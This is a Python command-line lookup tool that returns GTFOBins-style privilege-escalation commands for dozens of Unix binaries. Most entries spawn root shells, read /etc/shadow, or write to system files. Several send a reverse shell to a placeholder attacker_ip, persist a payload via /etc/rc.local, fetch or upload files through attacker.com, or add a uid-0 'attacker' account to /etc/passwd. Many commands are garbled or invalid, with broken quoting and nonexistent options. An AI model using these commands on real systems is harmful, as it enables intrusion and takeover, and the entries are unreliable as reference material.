#!/usr/bin/env python3
#A GTFO Bins lookup tool for a CLI

class colors:
    CRED = "\033[91m"
    CGREEN = "\033[92m"
    CYELLOW = "\033[93m"
    CBLUE = "\033[94m"
    CMAGENTA = "\033[95m"
    CCYAN = "\033[96m"
    BOLD = "\033[1m"
    ENDC = "\033[0m"

def color(text, col):
    return f"{col}{text}{colors.ENDC}"
logo = r'''
________  ________ ________              ________  ________  ___  ________     
|\   __  \|\  _____\\  _____\            |\   ____\|\   __  \|\  \|\   ___ \    
\ \  \|\  \ \  \__/\ \  \__/ ____________\ \  \___|\ \  \|\  \ \  \ \  \_|\ \   
 \ \  \\\  \ \   __\\ \   __\\____________\ \  \  __\ \   _  _\ \  \ \  \ \\ \  
  \ \  \\\  \ \  \_| \ \  \_\|____________|\ \  \|\  \ \  \\  \\ \  \ \  \_\\ \ 
   \ \_______\ \__\   \ \__\                \ \_______\ \__\\ _\\ \__\ \_______\
    \|_______|\|__|    \|__|                 \|_______|\|__|\|__|\|__|\|_______|                                                                      
    '''

for col in logo:
    print(color(col, colors.CCYAN), end="")
print() 

#Function for gtfo_bins that will hold the different commands and responses
def gtfo_bins(gtfo_command, gtfo_options):
    bins = []
    
    # Handle the 'zip' command with different options
    if gtfo_command == "zip":
        if gtfo_options == "shell":
            bins.append("TF=$(mktemp -u) zip $TF /etc/hosts -T -TT 'sh #'rm $TF")
        elif gtfo_options == "file-read":
            bins.append("LFILE=file-to-read TF=$(mktemp -u) zip $TF $LFILE unzip -p $TF'")
        elif gtfo_options == "sudo":
            bins.append("TF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF")
        elif gtfo_options == "suid":
            bins.append("TF=$(mktemp -u) ./zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF")
        elif gtfo_options == "file-write":
            bins.append("zip /tmp/archive.zip /tmp/* ")
    
    #Adding additional GTFO bins for other misconfigured binaries(there will be a lot)
    elif gtfo_command == "7zip":
        if gtfo_options == "shell":
            bins.append("TF=$(mktemp -u) 7z x -so /etc/hosts | sh")
        elif gtfo_options == "file-read":
            bins.append("LFILE=file_to_read 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so")
        elif gtfo_options == "sudo":
            bins.append("LFILE=file_to_read sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so")
        elif gtfo_options == "suid":
            bins.append("7z e /etc/hosts -o$TF; chmod +s $TF")
        elif gtfo_options == "file-write":
            bins.append("7z x malicious.zip -o/tmp")

    elif gtfo_command == "base64":
        if gtfo_options == "shell":
            bins.append("echo 'base64 -d /etc/hosts' | sh")
        elif gtfo_options == "file-read":
            bins.append("LFILE=file_to_read base64 '$LFILE' | base64 --decode")
        elif gtfo_options == "sudo":
            bins.append("LFILE=file_to_read sudo base64 '$LFILE' | base64 --decode")
        elif gtfo_options == "suid":
            bins.append("LFILE=file_to_read ./base64 '$LFILE' | base64 --decode")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nbase64 ""$LFILE"" | base64 --encode")

    elif gtfo_command == "bash":
        if gtfo_options == "shell":
            bins.append("bash")
        elif gtfo_options == "file-write":
            bins.append("export LFILE=file_to_write bash -c 'echo DATA > $LFILE'")
        elif gtfo_options == "file-read":
            bins.append ("export LFILE=file_to_read bash -c 'echo '$(<$LFILE)''")
        elif gtfo_options == "sudo":
            bins.append("sudo bash")
        elif gtfo_options == "suid":
            bins.append("sudo install -m =xs $(which bash) . ./bash -p")
    
    elif gtfo_command == "awk":
        if gtfo_options == "shell":
            bins.append ("awk 'BEGIN {system(""/bin/sh"")}'")
        elif gtfo_options == "file-write":
            bins.append("LFILE=file_to_write awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'")
        elif gtfo_options == "file-read":
            bins.append("LFILE=file_to_read awk '//' ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append("sudo awk 'BEGIN {system(""/bin/sh"")}'")
        elif gtfo_options == "suid":
            bins.append("sudo install -m =xs $(which awk) . ./awk 'BEGIN {system(""/bin/sh"")}'")
        
    elif gtfo_command == "base32":
        if gtfo_options == "shell":
             bins.append("echo 'base32 -d /etc/hosts' | sh")
        elif gtfo_options == "file-read":
            bins.append("LFILE=file_to_read base32 ""$LFILE"" | base32 --decode")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\n sudo base32 ""$LFILE"" | base32 --decode")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which base32) .\n LFILE=file_to_read base32 ""$LFILE"" | base32 --decode")
    
    elif gtfo_command == "busybox":
        if gtfo_options == "shell":
            bins.append("busybox sh")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\n./busybox cat ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("LFILE=file_to_write busybox sh -c 'echo ""DATA"" > $LFILE'")
        elif gtfo_options == "sudo":
            bins.append("sudo busybox sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which busybox) .\n./busybox sh")
        
    elif gtfo_command == "cat":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo cat ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which cat) .\nLFILE=file_to_read\n./cat ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncat ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append("cat /etc/hosts")
        elif gtfo_options == "file-write":
            bins.append(r"echo 'malicious content' | cat > /etc/hosts\n")
            bins.append(r"echo 'malicious content' | cat > /etc/passwd\n")
            bins.append(r"echo 'malicious content' | cat > /etc/shadow\n")
            bins.append(r"echo 'malicious content' | cat > /etc/sudoers\n") 

    elif gtfo_command == "neofetch":
        if gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF")
        elif gtfo_options == "suid":
            bins.append("neofetch --command 'bash'") 
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nneofetch --ascii $LFILE")
        elif gtfo_options == "file-write":
            bins.append("echo ""Some content"" | tee /path/to/file")
        elif gtfo_options == "shell":
            bins.append(r"TF=$(mktemp)\necho 'exec /bin/sh' >$TF\n neofetch --config $TF")

    elif gtfo_command == "cp":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_write\necho ""DATA"" | sudo cp /dev/stdin ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"LFILE=file_to_write\necho ""DATA"" | ./cp /dev/stdin ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append(r"echo ""bash -i >& /dev/tcp/attacker_ip/4444 0>&1"" > /tmp/malicious.sh\ncp /tmp/malicious.sh /etc/rc.local")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ncp ""$LFILE"" /dev/stdout")
        elif gtfo_options == 'file-write':
            bins.append(r"LFILE=file_to_write\necho ""DATA"" | cp /dev/stdin ""$LFILE""")
        
    elif gtfo_command == "curl":
        if gtfo_options == "sudo":
            bins.append(r"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl ""file://$TF"" -o ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=/tmp/file_to_read\ncurl file://$LFILE")
        elif gtfo_options == "shell":
            bins.append("curl -sL http://attacker_ip/malicious.sh > /etc/rc.local")

    elif gtfo_command == "chmod":
        if gtfo_options == "shell":
            bins.append(r'echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /tmp/reverse_shell.sh\nchmod u+s /tmp/reverse_shell.sh')
        elif gtfo_options == "sudo":
            bins.append(r'LFILE=file_to_change\nsudo chmod 6777 $LFILE')
        elif gtfo_options == "suid":
            bins.append(r"LFILE=file_to_change\n./chmod 6777 $LFILE")
        elif gtfo_options == "file-write":
            bins.append("echo ""attacker:x:0:0:attacker:/root:/bin/bash"" >> /etc/passwd")
        elif gtfo_options == "file-read":
            bins.append("chmod 644 /var/log/auth.log")
#Ignore the warning for the dosbox options when running the program! 
    elif gtfo_command == "dosbox":
        if gtfo_options == "file-write":
            bins.append(r"LFILE='\path\ to\ file_to_write'\ndosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE='\path\ to\ file_to_read'\ndosbox -c 'mount c /' -c ""type c:$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE='\path\ to\ file_to_write'\nsudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit")
        elif gtfo_options == "suid":
            bins.append(r"LFILE='\path\ to\ file_to_write'\n./dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"": -c exit")
        elif gtfo_options == "shell":
            bins.append("shell not available, please choose other options.")
            
    elif gtfo_command == "dmesg":
        if gtfo_options == "shell":
            bins.append(r"dmesg -H\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo dmesg -H\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ndmesg -rF ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("dmesg > /var/log/syslog")
        elif gtfo_options == "suid":
            bins.append(r"dmesg >> /etc/passwd\necho ""attacker:x:0:0:attacker:/root:/bin/bash"" >> /etc/passwd")

    elif gtfo_command == "gcc":
        if gtfo_options == "shell":
            bins.append("gcc -wrapper /bin/sh,-s ")
        elif gtfo_options == "sudo":
            bins.append("sudo gcc -wrapper /bin/sh,-s .")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ngcc -x c -E ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE")
        elif gtfo_options == "suid":
            bins.append("Run the sudo option!")
    
    elif gtfo_command == "vim" or gtfo_command == "vi":
        if gtfo_options == "shell":
            bins.append("vim -c ':!/bin/sh'")
        elif gtfo_options == "sudo":
            bins.append("sudo vim -c ':!/bin/sh'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which vim) .\n./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'")
        elif gtfo_options == "file-write":
            bins.append(r"vim file_to_write\niDATA\n^[\nw")
        elif gtfo_options == "file-read":
            bins.append("vim file_to_read")

    elif gtfo_command == "nano":
        if gtfo_options == "shell":
            bins.append("nano\n^R^X\nreset; sh 1>&0 2>&0")
        elif gtfo_options == "sudo":
            bins.append("sudo nano\n^R^X\nreset; sh 1>&0 2>&0")
        elif gtfo_options == "suid":
            bins.append("./nano -s /bin/sh\n/bin/sh\n^T")
        elif gtfo_options == "file-write":
            bins.append("nano file_to_write\nDATA\n^O")
        elif gtfo_options == "file-read":
            bins.append("nano file_to_read")

    elif gtfo_command == "zsh":
        if gtfo_options == "shell":
            bins.append("zsh")
        elif gtfo_options == "sudo":
            bins.append("sudo zsh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which zsh) .\n./zsh")
        elif gtfo_options == "file-read":
            bins.append(r"export LFILE=file_to_read\nzsh -c 'echo ""$(<$LFILE)""'")
        elif gtfo_options == "file-write":
            bins.append(r"export LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'")

    elif gtfo_command == "dd":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_write\necho ""data"" | sudo dd of=$LFILE	")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which dd) .\nLFILE=file_to_write\necho ""data"" | ./dd of=$LFILE")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\necho ""DATA"" | dd of=$LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\ndd if=$LFILE")

    elif gtfo_command == "aa-exec":
        if gtfo_options == "shell":
            bins.append("aa-exec /bin/sh")
        elif gtfo_options == "sudo":
            bins.append("sudo aa-exec /bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which aa-exec) .\n./aa-exec /bin/sh -p")
        elif gtfo_options == "file-read":
            bins.append("aa-exec -p /etc/apparmor.d/usr.bin.cat cat /etc/passwd")
        elif gtfo_options == "file-write":
            bins.append("aa-exec -p /etc/apparmor.d/usr.bin.tee echo ""This is some text"" | tee /tmp/output.txt")

    elif gtfo_command == "ab":
        if gtfo_command == "sudo":
            bins.append(r"URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL")
        elif gtfo_options == "suid":
            bins.append(r"URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL")
        elif gtfo_options == "shell":
            bins.append("shell not available, please use other command.")
        elif gtfo_options == "file-write":
            bins.append(r"Downloads -> URL=http://attacker.com/file_to_download\nab -v2 $URL")
        elif gtfo_options == "file-read":
            bins.append(r"Uploads -> URL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL")

    elif gtfo_command == "agetty":
        if gtfo_options == "shell":
            bins.append("agetty --noclear tty1 /bin/bash")
        elif gtfo_options == "sudo":
            bins.append("sudo /sbin/agetty --noclear tty1 /bin/bash")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which agetty) .\n./agetty -o -p -l /bin/sh -a root tty")
        elif gtfo_options == "file-write":
            bins.append("sudo /sbin/agetty --noclear tty1 /bin/bash -c ""echo 'malicious data' > /tmp/malicious_file.txt""")
        elif gtfo_options == "file-read":
            bins.append("/sbin/agetty --noclear tty1 /bin/cat /etc/shadow")

    elif gtfo_command == "alpine":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo alpine -F ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which alpine) .\nLFILE=file_to_read\n./alpine -F ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nalpine -F ""$LFILE""")
        elif gtfo_options == "file-write":
            bins.append("'sudo alpine --exec ""echo 'malicious data' > /tmp/malicious_file.txt""'")
        elif gtfo_options == "shell":
            bins.append("sudo alpine -command ""/bin/bash""")

    elif gtfo_command == "ansible-playbook":
        if gtfo_options == "shell":
            bins.append(r"TF=$(mktemp)\necho "'[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'" >$TF\nansible-playbook $TF")
        elif gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp)\necho "'[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'" >$TF\nsudo ansible-playbook $TF")
        elif gtfo_options == "file-read":
            bins.append("sudo ansible-playbook -i localhost, -c local -e ""file=/etc/shadow"" -m debug")
        elif gtfo_options == "file-write":
            bins.append("sudo ansible-playbook -i localhost, -c local -e ""file=/etc/shadow"" -m debug")
        elif gtfo_options == "suid":
            bins.append("ansible-playbook -i localhost, -c local -e ""file=/etc/shadow"" -m debug")

    elif gtfo_command == "ansible-test":
        if gtfo_options == "shell":
            bins.append("ansible-test shell")
        elif gtfo_options == "sudo":
            bins.append("sudo ansible-test shell")
        elif gtfo_options == "suid":
            bins.append("ansible-test run -v -e ""file=/etc/passwd"" -m debug")
        elif gtfo_options == "file-write":
            bins.append("""echo 'malicious_command' >> ~/.bashrc""")
        elif gtfo_options == "file-read":
            bins.append("ansible-test -i localhost, -c local -e ""file=/etc/shadow"" -m debug")

    elif gtfo_command == "aoss":
        if gtfo_options == "shell":
            bins.append("aoss /bin/sh")
        elif gtfo_options == "sudo":
            bins.append("sudo aoss /bin/sh")
        elif gtfo_options == "suid":
            bins.append("aoss echo ""malicious_command"" >> ~/.bashrc")
        elif gtfo_options == "file-write":
            bins.append("aoss /bin/bash -c 'echo ""Malicious content"" > /tmp/output.txt'")
        elif gtfo_options == "file-read":
            bins.append("aoss /bin/bash -c 'cat /etc/passwd'")
    
    elif gtfo_command == "apache2ctl":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo apache2ctl -c ""Include $LFILE"" -k stop")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\n apache2ctl -c ""Include $LFILE"" -k stop")
        elif gtfo_options == "file-write":
            bins.append("apache2ctl -S 2>&1 | tee /tmp/malicious_output.txt")
        elif gtfo_options == "shell":
            bins.append("apache2ctl -S; /bin/bash")
        elif gtfo_options == "suid":
            bins.append("apache2ctl -S; /bin/bash -c 'id'")

    elif gtfo_command == "apt-get" or gtfo_command == "apt":
        if gtfo_options == "shell":
            bins.append(r"apt-get changelog apt\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo apt-get changelog apt\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append("apt-get install -y /bin/bash")
        elif gtfo_options == "file-write":
            bins.append("echo '/bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1' > /tmp/reverse_shell.sh")
        elif gtfo_options == "file-read":
            bins.append("apt-get -qq list | grep -i 'package_name'")

    elif gtfo_command == "ar":
        if gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r ""$TF"" ""$LFILE""\ncat ""$TF""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ar) .\nTF=$(mktemp -u)\nLFILE=file_to_read\n./ar r ""$TF"" ""$LFILE""\ncat ""$TF""")
        elif gtfo_options == "file-read":
            bins.append(r"TF=$(mktemp -u)\nLFILE=file_to_read\nar r ""$TF"" ""$LFILE""\ncat ""$TF""")
        elif gtfo_options == "file-write":
            bins.append(r"TF=$(mktemp)\nLFILE=/path/to/sensitive/file\nar r ""$TF"" ""$LFILE""\nmv ""$TF"" /path/to/destination/file_to_write\ncat ""$TF""")
        elif gtfo_options == "shell":
            bins.append("ar rcs libexample.a file1.o file2.o; bash")

    elif gtfo_command == "aria2c":
        if gtfo_options == "sudo":
            bins.append(r"COMMAND='id'\nTF=$(mktemp)\necho ""$COMMAND"" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which aria2c) .COMMAND='id'\nTF=$(mktemp)\necho ""$COMMAND"" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x")
        elif gtfo_options == "shell":
            bins.append("aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa")
        elif gtfo_options == "file-read":
            bins.append(r"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\naria2c -o ""$LFILE""" "$URL""")
        elif gtfo_options == "file-write":
            bins.append("aria2c -d /path/to/directory -o filename.extension ""http://example.com/file""")

    elif gtfo_command == "arj":
        if gtfo_options == "sudo":
            bins.append(r"TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >""$TF/$LFILE""\narj a ""$TF/a"" ""$TF/$LFILE""\nsudo arj e ""$TF/a"" $LDIR")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which arj) .\nTF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >""$TF/$LFILE""\narj a ""$TF/a"" ""$TF/$LFILE""\nsudo arj e ""$TF/a"" $LDIR")
        elif gtfo_options == "file-write":
            bins.append(r"TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >""$TF/$LFILE""\narj a ""$TF/a"" ""$TF/$LFILE""\narj e ""$TF/a"" $LDIR")
        elif gtfo_options == "file-read":
            bins.append(r"TF=$(mktemp -u)\nLFILE=file_to_read\narj a ""$TF"" ""$LFILE""\narj p ""$TF""")
        elif gtfo_options == "shell":
            bins.append("arj a archive.arj file1 file2 directory")
    
    elif gtfo_command == "arp":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\narp -v -f ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo arp -v -f ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which arp) .\nLFILE=file_to_read\nsudo arp -v -f ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append("arp -s 127.0.0.1 00:00:00:00:00:01 && bash -i")
        elif gtfo_options == "file-write":
            bins.append('arp -s 127.0.0.1 00:00:00:00:00:01 | tee /tmp/arp_output.txt')

    elif gtfo_command == "as":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo as @$LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which as) .\nLFILE=file_to_read\n./as @$LFILE")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nas @$LFILE")
        elif gtfo_options == "shell":
            bins.append("as -o shell.o shell.asm")
        elif gtfo_options == "file-write":
            bins.append("as -o /tmp/shell.o write_shell.asm")

    elif gtfo_command == "ascii-xfr":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo ascii-xfr -ns ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nascii-xfr -ns ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ascii-xfr) .\nLFILE=file_to_read\nascii-xfr -ns ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append(r"python -c 'import socket, subprocess, os; s=socket.socket(); s.connect((\"attacker_ip\", 1234)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call([\"/bin/sh\", \"-i\"]);'")
        elif gtfo_options == "file-write":
            bins.append(r"echo ""<your transferred ASCII payload>"" > /tmp/reverse_shell.sh\nchmod +x /tmp/reverse_shell.sh\ncd /tmp\n./reverse_shell.sh")

    elif gtfo_command == "ascii85":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo ascii85 ""$LFILE"" | ascii85 --decode")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nascii85 ""$LFILE"" | ascii85 --decode")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nascii85 ""$LFILE"" | ascii85 --encode")
        elif gtfo_options == "shell":
            bins.append(r"ascii85 -d reverse_shell_ascii85.txt > reverse_shell.sh\nchmod +x reverse_shell.sh\n./reverse_shell.sh")
        elif gtfo_options == "suid":
            bins.append(r"ascii85 /etc/shadow > shadow_ascii85.txt\nascii85 -d shadow_ascii85.txt > decoded_shadow.txt\n")

    elif gtfo_command == "ash":
        if gtfo_options == "shell":
            bins.append("ash")
        elif gtfo_options == "sudo":
            bins.append("sudo ash")
        elif gtfo_options == "file-write":
            bins.append(r"export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which ash) .\n./ash")
        elif gtfo_options == "file-read":
            bins.append("find / -type f -perm -4000 2>/dev/null")

    elif gtfo_command == "aspell":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo aspell -c ""$LFILE""")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\naspell -c ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which aspell) .\nLFILE=file_to_read\naspell -c ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append("aspell -c /etc/shadow")
        elif gtfo_options == "file-write":
            bins.append("aspell -d /usr/share/dict/words > /tmp/root_written_file.txt")

    elif gtfo_command == "at":
        if gtfo_options == "shell":
            bins.append("echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null")
        elif gtfo_options == "sudo":
            bins.append("echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null")
        elif gtfo_options == "file-write":
            bins.append(r"COMMAND=id\necho ""$COMMAND"" | at now\n")
        elif gtfo_options == "file-read":
            bins.append("echo ""cat /etc/shadow"" | at now")
        elif gtfo_options == "suid":
            bins.append(r"ls -l $(which at)\necho ""cat /etc/passwd > /tmp/passwd_output.txt"" | at now")

    elif gtfo_command == "atobm":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which atobm) .\natobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\natobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'")
        elif gtfo_options == "file-write":
            bins.append("sudo chown <your-username>:<your-group> <file-path>")
        elif gtfo_options == "shell":
            bins.append("shell not available")

    elif gtfo_command == "aws":
        if gtfo_options == "shell":
            bins.append("aws help\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append("sudo aws help\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("aws s3 cp s3://bucket-name/file.txt .")
        elif gtfo_options == "file-write":
            bins.append("aws s3 cp /local/directory s3://your-bucket-name/directory --recursive")
        elif gtfo_options == "suid":
            bins.append("sudo install -m =xs $(which aws) .\naws help\n!/bin/sh")

    elif gtfo_command == "base58":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo base58 ""$LFILE"" | base58 --decode")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nbase58 ""$LFILE"" | base58 --decode")
        elif gtfo_options == "file-write":
            bins.append("python -c ""import base58; f = open('/path/to/outputfile', 'w'); f.write(base58.b58decode('2NEpo7TZRRrWzWTyX6oEU5kccLrBrCJAX4Tx').decode('utf-8')); f.close()""")
        elif gtfo_options == "suid":
            bins.append("python -c ""import base58; exec(base58.b58decode('2NEpo7TZRRrWzWTyX6oEU5kccLrBrCJAX4Tx'))""")
        elif gtfo_options == "shell":
            bins.append("python -c ""import base58; exec(base58.b58decode('2NEpo7TZRRrWzWTyX6oEU5kccLrBrCJAX4Tx'))""")

    elif gtfo_command == "basenc":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which basenc) .\nLFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nbasenc --base64 $LFILE | basenc -e --base64")
        elif gtfo_options == "shell":
            bins.append("echo ""/bin/bash -i"" | base64")

    elif gtfo_command == "basez":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo basez ""$LFILE"" | basez --decode")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which basez) .\nLFILE=file_to_read\nsudo basez ""$LFILE"" | basez --decode")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nbasez ""$LFILE"" | basez --decode")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nbasez ""$LFILE"" | basez --encode")
        elif gtfo_options == "shell":
            bins.append("echo ""/bin/bash -i"" | base64")

    elif gtfo_command == "batcat":
        if gtfo_options == "shell":
            bins.append(r"batcat --paging always /etc/profile\n!/bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo batcat --paging always /etc/profile\n!/bin/sh")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which batcat) .\n./batcat --paging always /etc/profile\n!/bin/sh")
        elif gtfo_options == "file-read":
            bins.append("batcat /path/to/file")
        elif gtfo_options == "file-write":
            bins.append("echo ""Injected content"" | batcat > /path/to/file")

    elif gtfo_command == "bc":
        if gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo bc -s $LFILE\nquit")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nbc -s $LFILE\nquit")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which bc) .\nLFILE=file_to_read\n./bc -s $LFILE\nquit")
        elif gtfo_options == "shell":
            bins.append("echo 'system(""sh"")' | bc")
        elif gtfo_options == "file-write":
            bins.append(r"LFILE=file_to_write\nbc -s $LFILE\nquit")

    elif gtfo_command == "bconsole":
        if gtfo_options == "shell":
            bins.append(r"bconsole\n@exec /bin/sh")
        elif gtfo_options == "sudo":
            bins.append(r"sudo bconsole\n@exec /bin/sh")
        elif gtfo_options == "file-read":
            bins.append("bconsole -c /etc/shadow")
        elif gtfo_options == "file-write":
            bins.append("bconsole -c /path/to/destination")
        elif gtfo_options == "suid":
            bins.append(r"./bconsole\n@exec /bin/sh")

    elif gtfo_command == "bpftrace":
        if gtfo_options == "sudo":
            bins.append("sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'")
        elif gtfo_options == "shell":
            bins.append("bpftrace -c /bin/sh -e 'END {exit()}'")
        elif gtfo_options == "suid":
            bins.append(r"TF=$(mktemp)\necho 'BEGIN {system(""/bin/sh"");exit()}' >$TF\nbpftrace $TF")
        elif gtfo_options == "file-write":
            bins.append(r"bpftrace -e 'tracepoint=syscalls:sys_enter_write /comm == ""your_program_name""/ { printf(""PID %d wrote %d bytes to fd %d\n"", pid, args->count, args->fd); }'")
        elif gtfo_options == "file-read":
            bins.append(r"bpftrace -e 'tracepoint=syscalls:sys_enter_read { printf(""PID %d read %d bytes\n"", pid, args->count); }' > file_reads.txt")

